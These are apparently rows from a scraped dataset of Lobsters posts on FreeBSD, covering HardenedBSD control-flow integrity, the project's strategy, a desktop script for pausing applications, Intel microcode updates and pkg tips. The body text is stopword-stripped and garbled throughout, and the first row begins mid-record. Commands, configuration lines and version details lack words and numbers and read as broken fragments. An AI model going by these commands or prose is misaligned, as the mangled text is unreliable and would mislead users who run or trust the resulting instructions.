toolchain component llvm implementation llvmar llvmnm llvmobjdump compilation application linktime optimization lto noncrossdso cfi noncrossdso cfi exploit mitigation technique help prevent attacker modifying behavior program jumping undefined arbitrary memory location microsoft implemented variant cfi term control flow guard cfg pax team spent last year perfecting reuse attack protector rap cfi cfg rap attempt accomplish goal rap complete effective implementation clang cfi stronger microsoft cfg pax team rap stronger cfi cfg rap would great addition hardenedbsd however requires toolchain patented clang cfi requires linker support linktime optimization lto hardenedbsd ship lld default linker cfi scheme enabled nearly application base please note application call function pointer resolved via dlopen dlsym require cfiicall scheme disabled hardenedbsd first enterprise operating system apply noncrossdso cfi broadly userland
267,Lobsters,freebsd,FreeBSD,"Strategic thinking, or what I think what we need to do to keep FreeBSD relevant",http://www.leidinger.net/blog/2019/01/27/strategic-thinking-or-what-i-think-what-we-need-to-do-to-keep-freebsd-relevant/,strategic thinking think need keep freebsd relevant,netapp juniper many project codefeatures vmware jail like test project last time mail project tcp code c rust report doc review known object tool day used isci ocsfc dtrace dwatch statemaps flamegraphs zfs ifuncs project ci freebsdwiki page idea fuzzing wwwfreebsdorg wrapup,since project time time say dead way go time troll know offer wear see world work fine see big like eg even dare look raise valid project would mail list sense going x stay bad dead would mean hold back new want write c well go ahead give try put port let get itthis also kind see u next year present thing project look stay long term able put scope need mean used like netapp juniper many base also used endusers workhorse eg mailservers mean user base use make easy fast user base want need kind term time time like webmailwhateverserver term mean speed also list item think new codefeatures doc project link point documentationhowtosexperiences forwith entry point project link point wikipedia codefeaturesthe train ovirt full speed marked bigimportant provider even joint eg vmware amazonazuregoogle long shall run ease use time keydrivers last piece go edge nonexclusiveor way like based cdn world yes jail way else even right play major role nice thing jail bhyve hand ezjail iocage ease use side enough still host view world moved avoid cloud privatecloud singleclick would need port cloudcontainer able work via jail andor bhyve able serve block big fall edge itarea long runwith readymade improve kernelsupport abi le like epoll among glibc based linuxbase port able run glibc check need catchup recent want able run readymade issue put jail start would like work good start would run test project test via start bug last time test failed back would also quite nice could test ci able run morethose linuximages ehrm work base cy iswas know port part mail may look like hand would would bring u point port need one port far able exact amount term sdn netopenvswitch leaf room netmap howto part yes part see doc need info able area also look sdn eg old project user choice fan short google code code removed due remove data shall instead eg remove x data shall way remove type x used server class nonitrelated shown since look vmware solaris query mainboardchassisdiskswhatever yes apple orange plot get alarm fail basic google code code look make sense take code improve code tree write new end user way long user use end make sense osprovided place would nice could get tempfan aihpc data well highavailability area also look mptcp tcp tree apple already using since good siri user exists code far usable look like progress since say serve recent year user expect alwayson fails able side clientserver high demand fall behind let u rest need also hand point item look mean write code base least port want write c rust offer explore new area even report fit need well ignore code c let want use instead want either learn used report docsi think improve enduser doc next base already well find could user use use user goal mind requires kind mail web one could argue project need run think need share lot find tip trick make work mind make active ldap client improve part part like make use zfs copy tool talk indepth doc part tip trick doc come u realworld need headstart item eg also nginx apache httpd guide doc improve even endusers also user need also review doc list eg mainained since long time known replace info info review may also find item need careone item mind term doc user part world term xaas also cloud going beyond term already put item like item also put new item like object go first docsitem term achieve goal user also developerdocumentation side yes man page describe api see room source code like tool day one kind extractablefromsource extractable already used place source search via egrep brieffile usrsrc already extract html pdf easy start dive best source code code found far isci ocsfc device code yes detail option need price one take one well one quirk bit work side nice using extend one item come mind dtrace area think need add probe kind probeconvention io maybe area like io io also look easy text based thanks devin teske dwatch web based make easy start click around get result set statemaps flamegraphs oraclesun zfs give idea dtrace make port would default option port option default eg depend upon default need build port nondefault option one could argue port extend help team review port come would come metaports use case eg flavour tool like mytop even go along realworld use instead o seen low via ifuncs even extend revise default non autotuned even autotuned one think would long run run autotuned way downtuning eg failsafeboot loader rcconf default changed project ci placed gained side even got first report nice help part effort freebsdwiki page future idea since month also page talk detail using talked since year became today think need improve goal think get fuzzing ci found eg clang fuzzing asan ubsan msan still maybe mature also make ci publicvisible build linked wwwfreebsdorg nag issue found doc add new test maybe port help extend test eg could ltp test project test test requires dist port ltp run test lot nice idea around hand get item wrapup item talked sexy thing fun item get paid would nice would nice lend hand one item maybe could ask could also item know mean work could made known known maybe want
268,Lobsters,freebsd,FreeBSD,FreeBSD Desktop – Part 16 – Configuration – Pause Any Application [2018],https://vermaden.wordpress.com/2018/09/19/freebsd-desktop-part-16-configuration-pause-any-application/,freebsd desktop part configuration pause application,kill process management ghost shell part xterm xdotool today show freeze application single keyboard shortcut mouse gesture utilize way small simple script freebsd desktop global page pkg pkg install xprop xdotool zenity xbindkeys desktoppausesh path bin script fetch scriptsdesktoppausesh http rawgithubusercontentcomvermadenscriptsmasterdesktoppausesh chmod x scriptsdesktoppausesh echo path grep script desktoppausesh desktoppausesh p l xbindkeys xbindkeysrc xbindkeys help key xbindkeys key xbindkeys key xbindkeysrc cat xbindkeysrc xbindkeys xbindkeys xbindkeys p ax grep firefox grep v grep p ax grep firefox grep v grep p ax grep firefox grep v grep desktoppausesh p p ax grep firefox grep v grep desktoppausesh p p ax grep firefox grep v grep xterm xbindkeys xinitrc xsession update update browsersuspender update seschwar stoppable layout xmonad update imglorp desktoppausesh pauseresume active window minimize pauseresume interactively selected window minimize http like,many desktop oriented operating system try provide various usability improvement feature like quite useful expose dashboard mac o x useless tile concept recent edition microsoft window system using unix many year knew could freeze pause process system kill sigstop signal unfreeze kill sigcont signal described process management section ghost shell part article way desktop application pita say least imagine opening xterm terminal searching chromium firefox process freezing one one every time need neither fortunately introduction called helper utility like xdotool possible implement usable manner today show freeze application single keyboard shortcut mouse gesture utilize way small simple script feature useful let say firefox started many tab open know drain battery life laptop close need information tab start firefox even battery usage load needed tab battery alternative pause firefox process use freeze process subprocesses use cpu battery power need unpause without need load tab example may heavy processing example started rawtherapee darktable processing large amount photo able smoothly watch video pause watch video unpause finish work also usable single player gaming really pause game literally may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content first need install called helper pkg command pkg install xprop xdotool zenity xbindkeys script would make magic happen desktoppausesh script available github syntax nicely colored save place searchable path variable like bin script directory make executable fetch scriptsdesktoppausesh http rawgithubusercontentcomvermadenscriptsmasterdesktoppausesh chmod x scriptsdesktoppausesh echo path grep script sbin bin usrsbin usrbin usrlocalsbin usrlocalbin homevermadenscripts three way usage desktoppausesh usage desktoppausesh option argument option pauseresume active window pauseresume interactively selected window p pauseresume specified pid l list paused processeswindows l list paused processeswindows pid argument pid p option started option would pauseunpause currently active window option best used keyboard shortcut mouse gesture start desktoppausesh script argument cursor change able select window freeze unfreeze p option usable terminal directly may want freezeunfreeze process without environment debugging purpose example last l option list application currently paused presentday generation laptop island type limited keyboard choose keyboard shortcut use still use thinkpad laptop keyboard little option pause break key seems best candidate feature use active window freezeunfreeze option shift pause break key interactive option create new keyboard shortcut use handy xbindkeys tool let see code put xbindkeysrc configuration file xbindkeys help xbindkeys philippe brochard usage xbindkeys option option v version print version exit default print default rc file f file use alternative rc file p pollrc poll rcguile configs update h help help x display set x display use v verbose information xbindkeys run show show actual keybinding k key identify one key pressed mk multikey identify multi key pressed g geometry size position window open kmk option n nodaemon nt start daemon single key need key option let xbindkeys key press combination key orand click window use one two line nocommand homexbindkeysrc bind key scheme function pause let read shift pause break sequence xbindkeys key press combination key orand click window use one two line nocommand homexbindkeysrc bind key scheme function shift pause needed information xbindkeysrc configuration file look configured cat xbindkeysrc pause break active window scriptsdesktoppausesh pause shift pause break interactive window scriptsdesktoppausesh shift pause let start xbindkeys verify work xbindkeys press pause break key terminal started xbindkeys utility hit enter several time terminal freezed hit pause break key etnered enter key passed unfreezed let check firefox example process run like usual r state like shown p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab freeze firefox pause break key process state p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab unfreeze pause break key get back normal r state p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab may course specify hand firefox pid current state desktoppausesh p info kill info kill info kill firefox browser paused p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab use unpause desktoppausesh p info kill info kill info kill viola firefox run p ax grep firefox grep v grep usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab firefox usrlocallibfirefoxfirefox contentproc childid isforbrowser prefslen schedulerprefs appdir usrlocallibfirefoxbrowser tab downside feature one remember paused application refresh process freezed see frozen epiphany browser upon xterm window moved pretty window like effect unpause epiphany get back normal shown remember add xbindkeys command xinitrc xsession file make permanent update one hacker news user named explained lack window content refresh application freezed cite comment depends window manager application state really affected stop updating redrawing area another window move away window manager asks underlying application update area screen dead wm keep displaying last thing something else happens spot hand compositing window manager dedicate separate buffer application exclusive access kind window manager would ask application update anything would take image dedicated application buffer update screen since application buffer modified anything else would last state application would turn find way screen glitch update one reddit user pointed browsersuspender solution simply suspends browser focus using stopcont signal update lobster user seschwar pointed stoppable layout functionality xmonad automatically pause process window except active one also us sigcont sigstop signal update one hacker news user named imglorp suggested command could also iconifyminify app window really good idea added option also minimize window desktoppausesh usage desktoppausesh option argument option pauseresume active window pauseresume active window minimize pauseresume interactively selected window pauseresume interactively selected window minimize p pauseresume specified pid l list paused processeswindows l list paused processeswindows pid argument pid p option changelog desktoppausesh script http eof like like loading related
269,Lobsters,freebsd,FreeBSD,Update Intel Microcode on FreeBSD,https://www.thomas-krenn.com/en/wiki/Update_Intel_Microcode_on_FreeBSD,update intel microcode freebsd,freebsd intel microcode intel microcode microcode version cpuid devcpudata cpuctl cpucontrol sysutilscpupdate variant variant update via devcpudata variant update via cpupdate variant update via cpupdate werner fischer,freebsd provides support updating microcode processor startup runtime article use server running freebsd show check intel microcode version install newer microcode version necessary example setup example use following setup server using asus mainboard bios version intel celeron cpu freebsd example carried current bios microcode software version available time clearly show latest security update installed securitycritical environment term microcode software update read current microcode version microcode update guidance intel list new microcode version intel celeron cpuid used example information cpu name cpuid microcode version queried tool loading module cpuctl kldload cpuctl output line microcode version show version example cpuid found second line eax output example root kldload cpuctl root mp table apic id version state family model step flag bsp usable ap usable found identical cpu extended family extended model family model stepping type original oem cpu model best guess xeon haswell processor name string bios programmed intel r celeron r cpu microcode version eax eax ebx ecx edx eax eax ebx ecx edx bfebfbff intel provides information available microcode version document microcode update guidance see intel microcode microcode version document list cpu cpuid searching document microcode update guidance column new production mcu rev contains microcode version case intel provides newer microcode version currently available bios example system variant update via devcpudata port devcpudata contains intel amd cpu microcode update binary file microcode devcpudata imported cpu via cpuctl cpucontrol update microcode carried automatically start process entry cpumicrocodeload cpumicrocodename must added bootloaderconf install microcode update automatically future install package devcpudata enter option bootloaderconf pkg install devcpudata vi bootloaderconf cat bootloaderconf cpumicrocodeload yes cpumicrocodename bootfirmwareintelucodebin reboot example system microcode version updated root pkg install devcpudata message installing port allow host startup update cpu microcode freebsd system automatically two method updating cpu microcode first method load applies update kernel begin booting second method load applies update using rc script first method preferred currently supported intel processor running freebsd safe enable method first method ensures cpu feature introduced microcode update visible kernel word update loaded kernel performs cpu feature detection enable update using first method add following line system bootloaderconf cpumicrocodeload yes cpumicrocodename bootfirmwareintelucodebin method load microcode update system rebooted enable update using second method add following line system etcrcconf microcodeupdateenable yes ensure update applied reboot system start microcode update service via service microcodeupdate start cpu requires microcode update console message following appear updating cpu microcode updating cpu rev rev done updating cpu rev rev done updating cpu rev rev done updating cpu rev rev done done root l lh bootfirmwareintelucodebin rwr r root wheel jan bootfirmwareintelucodebin root vi bootloaderconf root cat bootloaderconf cpumicrocodeload yes cpumicrocodename bootfirmwareintelucodebin root reboot reboot new microcode use root kldload cpuctl root grep microcode microcode version variant update via cpupdate addition variant described another port updating microcode available since sysutilscpupdate developed stefan blachmann alternative devcpudata avoid bug limitation devcpudata new tool cpupdate offer additional function eg simple query current microcode via cpupdate developer recommends compile tool upgrade selfcompiled port difficult variant installation cpupdate test system done follows portsnap auto cd usrportssysutilscpupdate make install beispielsystem ausgeführt root portsnap auto root cd usrports root usrports make search namecpupdate port path usrportssysutilscpupdate info cpu microcode update utility maint eugen freebsdorg bdeps rdeps www http githubcomkernschmelzecpupdate root usrports cd usrportssysutilscpupdate root usrportssysutilscpupdate make install buildinginstalling required config dialog x cpm download platomavcpumicrocodes collection x intel download intel microcode pack ok cancel license accepted user depends file usrlocalsbinpkg found nt seem exist usrportsdistfiles attempting fetch http kb kbps installing note following directory usrportssysutilscpupdateworkintelucode contain intel andor platomavcpumicrocodes collection respectively built port corresponding cpmintel option enabled case run make installmicrocodes install usrlocalsharecpupdate suspendresume sequence clear microcode update make sure system run service cpupdate start resume root usrportssysutilscpupdate make installmicrocodes binrm f rf usrlocalsharecpupdatecpumicrocodesprimaryintel binmkdir p usrlocalsharecpupdatecpumicrocodesprimaryintel note manually remove directory usrlocalsharecpupdatecpumicrocodesprimaryintel deinstallation cpupdate note manually remove directory usrlocalsharecpupdatecpumicrocodessecondaryintel deinstallation cpupdate root usrportssysutilscpupdate cpupdate bietet die folgenden optionen cpupdate usage cpupdate qwvvuicxiavh fu microcodefile cpsst datadir show processor information u update microcode u update microcode using file microcodefile w write without option cpupdate simulates updating q quiet mode v verbose mode vv verbose p use primary repo path datadir use secondary repo path datadir v print version h show help iav option vendor mode must set atm intel implemented f show version information microcode file c check integrity microcode file datadir c addition print microcode file statistic c convertcompact microcode file legacy multiblob intelucode file format x convert extract microcode file multiblob intelucode legacy file format source dir converting target dir converting update microcode runtime look follows example system root usrportssysutilscpupdate cpupdate found cpu intel core cpuid fam mod step flag ucode root usrportssysutilscpupdate cpupdate u found cpu intel updating error registering cpu feature successfully registered new cpu feature attention notice w option missing actual update dry run done root usrportssysutilscpupdate cpupdate w u found cpu intel updating error registering cpu feature successfully registered new cpu feature root usrportssysutilscpupdate cpupdate found cpu intel core cpuid fam mod step flag ucode root usrportssysutilscpupdate automatically update microcode startup following step required add bootloaderconf cpuctlload yes add etcrcconf cpupdateenable yes rebot reboot cpupdate show new microcode version example system root cpupdate found cpu intel core cpuid fam mod step flag ucode root difference testing two variant became apparent microcode variant update via devcpudata loaded early boot process already first initialization cpu four structured extended ibpb stibp ssbd recognized provided microcode version excerpt dmesg output copyright c freebsd project copyright c regent university california right reserved freebsd registered trademark freebsd foundation freebsd generic freebsd clang version based llvm vt efifb resolution cpu intel r celeron r cpu cpu origin genuineintel structured extended ibpb stibp ssbd real memory mb avail memory mb cpu microcode updated variant update via cpupdate two four structured extended feature missing beginning therefore older microcode version still use beginning seen via dmesg copyright c freebsd project cpu intel r celeron r cpu cpu origin genuineintel structured extended ibpb stibp real memory mb trying mount root ufs rw cpu intel r celeron r cpu cpu origin genuineintel structured extended ibpb stibp ssbd variant update via cpupdate also possible load microcode beginning however exact microcode file cpu must listed example system possible following entry bootloaderconf cpumicrocodeload yes cpumicrocodename reference author werner fischer werner fischer working knowledge transfer team thomaskrenn completed study computer medium security fh hagenberg austria regular speaker many conference like linuxtag osmc osdc linuxcon author various magazine spare time enjoys playing piano training good result annual linz marathon relay
270,Lobsters,freebsd,FreeBSD,Less Known pkg(8) Features,https://vermaden.wordpress.com/2019/01/17/less-known-pkg8-features/,le known pkg feature,howto keeping freebsd base system package uptodate freebsd handbook using pkg binary package management older freebsd version database find vardbpkg pkg shell q file vardbpkg vardbpkglocalsqlite q lockunlock pkg lock l pkg delete exfatutils pkg unlock exfatutils pkg lock exfatutils provides pkgprovides pkg search provides pkg install pkgprovides cat eof usrlocaletcpkgconf pkgpluginsdir usrlocallibpkg pkgenableplugins true plugins provides eof pkg provides pkg provides binpldd pkg provides u pkg provides binpldd pkg install compatlinuxusrbinpldd pkg upgrade file vardbpkg vardbpkg sort n du csm vardbpkg du csma vardbpkg pkg bootmodulesdrmko pkg bootkerneldrmko double gun double fun firefox pkg firefox periodic pkg install parallel p ax grep pkg find etcperiodic usrlocaletcperiodic name pkg find etcperiodic usrlocaletcperiodic name pkg xargs grep e az enable p ax grep pkg pkg install parallel n stats pkg stats pkg size head man pkgsize alias pkgsizepkg info sort k h tail column pkgsize pkgsize short name pkg autor pkg upg pkg inf metadata pkg update f fixing broken dependency portmaster checkdepends n pkg info grep libxul pkg info qoa grep libxul pkg shell updating le usrportsupdating pkg updating http wwwfreshportsorgupdating bulletproof upgrade zfs boot environment poland pbug netherlands nluug http isgdbectl beadm create safepoint beadm list pkg upgrade query pkg info r pkg query e n ro pkg query n v sort n read timestamp pkgname echo date r timestamp pkgname done head echo tail pkg query e n tail rosetta stone freebsd wiki function old tool new tool like,asked many time write article pkg current freebsd modern package manager sometimes also called pkgng entry try describe le known pkg feature year ago pkg even existed wrote howto keeping freebsd base system package uptodate post even later published bsd magazine episode issue back keeping package date little tricky forced use freebsd stable branch package release never updated like currently openbsd world package freebsd stable branch built every week enough time could course compile everything freebsd port using portmaster waste lot time compiling life pkgaddpkgdeletepkginfo package tool freebsd pkgupgrade script bsdadminscripts package quite helpful upgrade process would fetch latest available package stable branch ftp server update installed package check security issue package another external tool called portaudit needed today pkg feature along pkg upgrade update installed package thanks pkg audit third party tool portaudit longer needed even pkg autoremove automatically remove unneeded dependency try copy information available already great freebsd handbook described using pkg binary package management chapter older freebsd version freebsd use new pkg tool instead old pkg one need withpkgngyes etcmakeconf file currently supported release freebsd recently released still stable polished need put anything etcmakeconf file anymore use pkg framework database pkg database sqlite database actually kept vardbpkg directory content vardbpkg dir pkg bootstrap process find vardbpkg vardbpkg vardbpkgfreebsdmeta vardbpkgvulnxml vardbpkglocalsqlite vardbpkgrepofreebsdsqlite important file vardbpkglocalsqlite file database installed package file typing pkg shell actually connect sqlite database sqlite interpreter pkg shell loading resource homevermadensqliterc sqlite version enter help usage hint q reason find pkg tool work broken may connect command package use sqlite package hold version sqlite forward compatible version used pkg file vardbpkg vardbpkgfreebsdmeta ascii text vardbpkglocalsqlite sqlite database user version last written using sqlite version vardbpkgrepofreebsdsqlite sqlite database user version last written using sqlite version vardbpkgvulnxml xml document unicode text long line vardbpkglocalsqlite loading resource homevermadensqliterc sqlite version enter help usage hint q lockunlock pkg specified package locked pkg lock command mean pkg upgrade even pkg delete operation pkg autoremove would touch list locked package l option shown pkg lock l currently locked package pkg delete exfatutils checking integrity done conflicting following package locked may removed exfatutils package requested removal locked missing see possible pkg delete locked exfatutils package first unlock pkg unlock command interactively option shown pkg unlock exfatutils unlock package yn unlocking pkg lock exfatutils locking would lock package based experience potential reason lock certain package combine package port package port exist official package different default option really want use older version package actually use lockunlock mechanism true combine port package practice often discouraged freebsd world software use available package licensing issue anything related microsoft exfat filesystem exfatutilsfusefsexfat lame astonishing openbsd provides lame package since year yet freebsd team still scared patent also need build custom version ffmpeg package include lame support still custom last thing keep locked conky still working great version developer broke badly version even available possible right click mouse desktop openbox menu name issue conky pas mouse event window manager ruled desktop used one port tool portdowngrade fetch last file port tree compile conky package lock good probably already know prefer run screen information use conky rarely freebsd dashboard needed information enable need scroll lock key record look provides also happen rhelfedora yumrpm user probably missed provides feature freebsd pkg package manager useful provides database install package specifying exact binary file name package example type yum install sbinifconfig install nettools package provides database needed information tell achieve similar functionality pkg tool pkgprovides plugin allows query package provides particular file directly pkg tool even available pkgprovides package show install configure first install pkgprovides package pkg search provides pkg plugin querying package provides particular file pkg install pkgprovides updating freebsd repository catalogue freebsd repository date repository date following package affected checked new package installed pkgprovides freebsd number package installed kib downloaded proceed action yn fetching kib checking integrity done conflicting installing extracting message pkg plugin activation order use pkgprovides plugin need enable plugins pkg uncomment following line usrlocaletcpkgconf file add pkgprovides supported plugin list pkgpluginsdir usrlocallibpkg pkgenableplugins true plugins provides run pkg plugins see plugins handled pkg update provides database run pkg provides u configure usrlocaletcpkgconf file cat eof usrlocaletcpkgconf pkgpluginsdir usrlocallibpkg pkgenableplugins true plugins provides eof new command called pkg provides shown pkg provides usage pkg provides uf pattern plugin querying package provides particular file pkg provides binpldd provides database found please update first update provides database u option pkg provides u fetching provides database mib extracting database success example usage pkg provides plugin pkg provides binpldd name desc toolset based solaris ptools functionality repo freebsd filename usrlocalbinpldd name desc base set package needed linux mode linux centos repo freebsd filename compatlinuxusrbinpldd pkg install compatlinuxusrbinpldd updating freebsd repository catalogue freebsd repository date repository date pkg package available install matching compatlinuxusrbinpldd found repository althou possible example install package typing pkg install compatlinuxusrbinpldd command possible check package contains file next time type pkg upgrade command would also see provides database updating pkg upgrade updating freebsd repository catalogue fetching metatxz b fetching packagesitetxz mib processing entry fetching provides database mib extracting database success freebsd repository update completed package processed repository date checking integrity done conflicting pkg provides database take notable space vardbpkg directory file vardbpkg vardbpkg sort n vardbpkgfreebsdmeta ascii text vardbpkglocalsqlite sqlite database user version last written using sqlite version vardbpkgprovides directory vardbpkgprovidesprovidesdb ascii text vardbpkgrepofreebsdsqlite sqlite database user version last written using sqlite version vardbpkgvulnxml xml document unicode text long line use zfs compression like take much shown du csm vardbpkg vardbpkgfreebsdmeta vardbpkglocalsqlite vardbpkgprovides vardbpkgrepofreebsdsqlite vardbpkgvulnxml total use ufs almost mb database may scare little du csma vardbpkg vardbpkgfreebsdmeta vardbpkglocalsqlite vardbpkgprovides vardbpkgrepofreebsdsqlite vardbpkgvulnxml total pkg provides needed information file package yet installed pkg command pkg equivalent classic unix command show package file belongs pkg bootmodulesdrmko bootmodulesdrmko installed package pkg bootkerneldrmko bootkerneldrmko found database double gun double fun sometimes faster use whiches time get needed answer firefox usrlocalbinfirefox pkg firefox usrlocalbinfirefox installed package periodic may happen see something like one pkg install parallel updating freebsd repository catalogue freebsd repository date repository date pkg get advisory lock database locked another process launched pkg instance going let check p output p ax grep pkg binsh usrlocalsbinpkg shell dump usrlocalsbinpkg shell dump freebsd periodic script job check look find etcperiodic usrlocaletcperiodic name pkg think activity needed may disable value etcperiodicconf file find etcperiodic usrlocaletcperiodic name pkg xargs grep e az enable dailystatuspkgngchangesenable dailybackuppkgngenable securitystatuspkgchecksumenable securitystatuspkgauditenable weeklystatuspkgngenable example would like disable execution need add dailystatuspkgngchangesenableyes etcperiodicconf file lefs chack p output p ax grep pkg grep color pkg periodic job already finished may install package usual pkg install parallel updating freebsd repository catalogue freebsd repository date repository date following package affected checked new package installed parallel number package installed process require mib space mib downloaded proceed action yn n stats pkg stats command provides stats installed package useful find package take space pkg stats local package database installed package disk space occupied gib remote package database number repository package available unique package total size package gib also pkg size command display space used package without package name useful pkg size head also man page pkg size exist man pkgsize manual entry pkgsize use pkg info command sort output way also display space usage various unit like kibmibgib help fortunatelly h option sort come help using following alias sort package space usage limited output largest package feel free change need alias pkgsizepkg info sort k h tail column pkgsize pkgsize aliased pkg info sort k h tail column pkgsize short name pkg tool also support short name argument example type pkg autoremove pkg autor part needed command work example short name blow pkg autor pkg upg pkg inf metadata many problem pkg triggered old metadata database case face pkg issue first update forcefully database shown pkg update f updating freebsd repository catalogue fetching metatxz b fetching packagesitetxz mib processing entry fetching provides database mib extracting database success freebsd repository update completed package processed repository date record provides database also updated process fixing broken dependency time one missing dependency vulnerable package started torture time even despered compile everything portmaster already started portmaster checkdepends command said n asked fix downgrade lot package needlessly portmaster checkdepends checking dependency evince graphicsevince missing dependency missing package dependency detected found issue total package database following package installed downgrading perl downgrading glib downgrading giofambackend downgrading libffi downgrading gobjectintrospection downgrading atk downgrading downgrading pango downgrading gtkupdateiconcache downgrading dbus downgrading gtk downgrading dbusglib installing libxul installation require mb space mb downloaded try fix missing dependency yn n summary action performed dependency failed fixed still missing dependency advised try fixing manually also make sure check pkg updating known issue let see pkg show installed pkg info grep libxul mozilla runtime package used bootstrap xulxpcom apps pkg info qoa grep libxul wwwlibxul problem installed wwwlibxul instead portmaster complains pkg introduced easy grep r entire vardbpkg directory file database quite complicated package database kept sqlite database using pkg shell command connect database let check find pkg shell sqlite version enter help instruction enter sql statement terminated sqlite database seq name file main vardbpkglocalsqlite sqlite table category license pkgdirectories script deps mtree pkggroups shlibs directory option pkglicenses user file package pkgshlibs group pkgcategories pkgusers sqlite header sqlite mode column sqlite pragma tableinfo deps cid name type notnull dfltvalue pk origin text name text version text packageid integer sqlite quit know deps table probably looking pkg shell quite limited sqlite browsing use command limited mean type pkg shell select deps query first need start pkg shell type query column vardbpkglocalsqlite select deps grep libxul libxul second column name let try use header column vardbpkglocalsqlite select deps namelibxul origin name version packageid libxul problematic dependency entry nailed let modify little real installed package state vardbpkglocalsqlite update deps set originwwwlibxul namelibxul vardbpkglocalsqlite update deps set namelibxul course use official way using pkg shell command pkg shell sqlite version enter help instruction enter sql statement terminated sqlite update deps set originwwwlibxul namelibxul sqlite update deps set namelibxul sqlite header sqlite mode column sqlite select deps namelibxul origin name version packageid wwwlibxul libxul sqlite quit portmaster happy complain missing dependency portmaster checkdepends checking dependency zenity checking dependency zip checking dependency zsh viola problem solved pkg tool already called pkg set two useful option man pkgset n oldname newname changename oldname newname change package name given dependency oldname newname oldorigin neworigin changeorigin oldorigin neworigin change port origin given dependency oldorigin neworigin corresponds port directory package originated typically needed upgrading library package moved default version major port dependency change deprecated usually explained usrportsupdating also see pkgupdating example case would use pkg set wwwlibxul command sure solve problem way also updated version database updating get trouble pkg upgrade command also check latest version usrportsupdating file available updating port tree portsnap fetch update command example describes important changed port package package built port le usrportsupdating affect user sysutilsansible author lifanov freebsdorg ansible port flavored package name ansible changed include python version poudriere package user nt need anything rename installed package match new naming scheme example run pkg set n affect user author swill freebsdorg default ruby version updated compile port may keep default version adding following line etcmakeconf file keep ruby default version wish update new default version need first stop software us ruby need follow step depending upon manage system use pkgng simply upgrade pkg upgrade use portmaster install new ruby rebuild port depend ruby portmaster portmaster r r use portupgrade install new ruby rebuild port depend ruby pkg delete f ruby portupgrade make c usrportsportsmgmtportupgrade install clean pkg set portupgrade x fr pkg framework also tool pkg updating command check man pkgupdating page detail common use case would using argument date shown pkg updating affect user multimediavlc author riggs freebsdorg multimediavlc port upgraded latest upstream release subsequently retired removed port tree user previously used might want switch multimediavlc following command pkg install multimediavlc portmaster multimediavlc portupgrade multimediavlc may well check updating file online http wwwfreshportsorgupdating address bulletproof upgrade zfs boot environment absolutely sure working system matter went wrong pkg upgrade command use zfs boot environment made talk poland pbug netherlands nluug feature long ago latest pdf presentation still available http isgdbectl link procedure beadm command look like beadm create safepoint created successfully beadm list active mountpoint space created nr safepoint pkg upgrade anything wrong happen still fully working system safepoint boot environment name reboot select freebsd loader back working system like would back time time machine query also use pkg query command seek intormation need example emulate pkg info r pkgname argument display list package require pkgname use pkg query command shown pkg info r pkg query e n ro graphicscolordgtk gamesfreeciv graphicscolord devellibsoup devellibsoupgnome develsubversion securitynss ftpfilezilla wwwepiphany graphicsdarktable graphicshugin netimpidgin mailthunderbird wwwmidori wwwfirefox would like know package installed first time use spell pkg query n v sort n read timestamp pkgname echo date r timestamp pkgname done head echo tail fri jul cest fri jul cest fri jul cest fri jul cest fri jul cest fri jul cest fri jul cest fri jul cest fri jul cest fri jul cest sun jan cet sun jan cet wed jan cet wed jan cet wed jan cet wed jan cet wed jan cet wed jan cet wed jan cet wed jan cet also display package removed pkg autoremove command installed directly pkg query e n tail xmp xorg xprintidle xterm xxkb youtubedl zenity zfsstats zip zsh rosetta stone freebsd wiki page also provides table information incomplete thus copied table filled missing data find updated rosetta stone old pkg tool compared current pkg framework function old pkg tool new pkg tool list installed package pkginfo pkg info basic info package pkginfo pkgnamepkgversion pkg info pkgname pkg info categoryname pkg info pkgnamepkgversion detailed info package na pkg info f pkgname pkg info f categoryname pkg info f pkgnamepkgversion list file installed package pkginfo l pkgnamepkgversion pkg info l pkgname pkg info l categoryname pkg info l pkgnamepkgversion find package provides file pkginfo w pathtomyfile pkg pathtomyfile install local package pkgadd localpkgtbz pkg add localpkgtxz install remote package pkgadd r mypackage pkg install mypackage pkg install categoryname pkg install pkgnamepkgversion search remote package l usrports grep mypackage pkg search mypackage pkg search categoryname pkg search pkgnamepkgversion search detailed info remote package make search namemypackage make search keymypackage pkg search f mypackage pkg search f categoryname pkg search f pkgnamepkgversion reverse deps installed package pkginfo r pkgnamepkgversion pkg info r mypackage pkg info r categoryname pkg info r pkgnamepkgversion deps installed package pkginfo r pkgnamepkgversion pkg info mypackage pkg info categoryname pkg info pkgnamepkgversion remove unused package install dep na pkg autoremove binary upgrade installed package pkgupgrade freebsd port pkg upgrade create remote repository na pkg repo directorywithpackages manipulate package jail na pkg j manipulate package chroot pkgadd c pkg c info installed package using pkginfo x pkg info x info installed package using extended pkginfo x pkg info x info installed package using globbing pkginfo pkg info g check known vulnerability portaudit freebsd port pkg audit date package pkgversion l pkg version l date package pkgversion il pkg version il date package compared remote repo na pkg upgrade n statistic installed package na pkg stat checking missing dependency fix na pkg check port origin pkginfo pkg info know useful pkg spell let know eof like like loading related
